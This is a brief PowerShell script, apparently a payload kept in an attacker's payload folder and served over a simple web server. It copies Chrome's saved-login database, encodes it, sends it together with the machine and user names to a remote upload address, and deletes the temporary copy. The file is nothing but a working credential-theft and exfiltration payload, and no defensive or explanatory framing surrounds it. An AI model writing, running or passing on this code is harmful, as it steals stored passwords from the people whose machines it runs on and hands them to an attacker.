# ~/hexbox/payloads/chrome.ps1 - served via "python3 -m http.server 80"
$path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
$tmp  = "$env:TEMP\ld.db"
Copy-Item $path $tmp -Force
$bytes = [IO.File]::ReadAllBytes($tmp)
$b64   = [Convert]::ToBase64String($bytes)
Invoke-WebRequest -Uri "http://10.0.0.99:8000/upload" -Method POST -Body @{data=$b64; host=$env:COMPUTERNAME; user=$env:USERNAME}
Remove-Item $tmp -Force
